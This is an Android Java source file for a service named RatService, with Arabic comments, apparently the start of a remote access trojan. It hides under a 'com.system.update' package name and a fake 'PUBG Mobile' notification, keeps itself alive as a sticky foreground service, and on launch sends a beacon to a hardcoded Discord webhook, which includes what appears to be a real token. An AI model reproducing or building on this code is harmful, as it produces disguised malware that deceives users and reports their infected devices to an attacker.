package com.system.update;

import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.io.IOException;
import okhttp3.*;

public class RatService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        
        // بدء الخدمة في المقدمة عشان النظام ميقفلهاش
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId)
                    .setContentTitle("PUBG Mobile").setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }

        // إرسال رسالة اختبار مباشرة للديسكورد
        sendPing();
    }

    private void sendPing() {
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        String jsonBody = "{\"content\": \"🚀 **تطبيق PUBG Mobile اشتغل بنجاح على الجهاز!**\"}";
        RequestBody body = RequestBody.create(jsonBody, JSON);
        
        Request request = new Request.Builder()
                .url(WEBHOOK_URL)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // لو النت مقطوع
                e.printStackTrace();
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                // لو الرسالة اتبعتت بنجاح
                response.close();
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
